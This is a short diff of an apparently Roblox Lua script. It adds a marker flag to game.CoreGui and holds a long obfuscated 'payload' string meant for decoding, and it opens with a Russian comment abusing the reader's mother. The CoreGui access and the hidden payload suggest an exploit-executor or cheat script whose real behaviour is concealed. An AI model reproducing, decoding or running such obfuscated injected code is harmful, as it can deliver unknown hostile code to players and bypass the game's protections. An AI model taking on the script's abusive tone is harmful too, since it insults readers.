@@ -1,5 +1,9 @@
 -- ЕСЛИ ТЫ ЭТО ЧИТАЕШЬ ТО ТВОЯ МАТЬ СДОХЛА
 
+local EZKA_ALR = Instance.new("BoolValue")
+EZKA_ALR.Name = "EZKA_ALR"
+EZKA_ALR.Parent = game.CoreGui
+
 local payload = "q8Cd3Fw0.r3Cv7Gh1.x9Kj2Lw1.z5Xv1Gh6.i2Qw8Xz5.o7Er3Cd0.u4As6Vw3.j9Mk3Er8.e6Xz2Df8.v3Cx9As4.6Xz2Df8k.v3Cx9As4.x9Kj2Lw1.w1Rt9Sp4.h8Bn4Jm9.8Yt2Sp0A.V7Sd3Lp1.o7Er3Cd0.o7Er3Cd0.t5Bn4Jk9.C5Pa9Jk2.h8Bn4Jm9.o7Er3Cd0.6Xz2Df8k.9Lm1Kp2n.b7Nz2Qw5.o7Er3Cd0.o7Er3Cd0.t5Bn4Jk9.i2Qw8Xz5.8Yt2Sp0A.2Hj1Kw8G.2Hj1Kw8G.t5Bn4Jk9.x9Kj2Lw1.i2Qw8Xz5.o7Er3Cd0.h8Bn4Jm9.k1Lp6Ko2.f9Sd1Lp2.4Qw1Xz3y.x9Kj2Lw1.t5Bn4Jk9.t5Bn4Jk9.2Hj1Kw8G.q2Ws8Df3.m4Rt7Yp0.i2Qw8Xz5.3Cx9As4d.q2Ws8Df3.A8Rt2Sp1.k1Lp6Ko2.C5Pa9Jk2.2Hj1Kw8G.u4As6Vw3.x9Kj2Lw1.s3Io7Gh1.9Lm1Kp2n.3Cv7Gh1l.3Cv7Gh1l.6Xz2Df8k.3Cv7Gh1l"
 local layers = 1
 
